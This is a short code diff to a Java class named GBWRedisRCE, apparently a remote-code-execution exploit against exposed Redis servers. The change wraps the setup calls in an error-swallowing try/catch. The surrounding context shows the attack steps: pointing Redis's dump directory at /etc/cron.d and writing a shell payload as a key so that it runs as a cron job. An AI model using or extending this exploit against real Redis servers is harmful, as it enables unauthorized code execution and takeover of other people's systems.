@@ -76,8 +76,12 @@ public class GBWRedisRCE {
 
     private static void prepare(Jedis jedis){
 
-        jedis.configSet("stop-writes-on-bgsave-error","no");
-        jedis.slaveofNoOne();
+        try {
+            jedis.configSet("stop-writes-on-bgsave-error","no");
+            jedis.slaveofNoOne();
+        }catch (Exception e){
+            
+        }
     }
 
     private static void printCmd(String cmd,String res){
@@ -118,7 +122,7 @@ public class GBWRedisRCE {
         }catch (Exception e){
 
         }
-        
+
         /*try to write to /etc/cron.d/redis*/
         printCmd("config set dir /etc/cron.d",jedis.configSet("dir","/etc/cron.d"));
         printCmd("set x "+shell,jedis.set("x",shell));
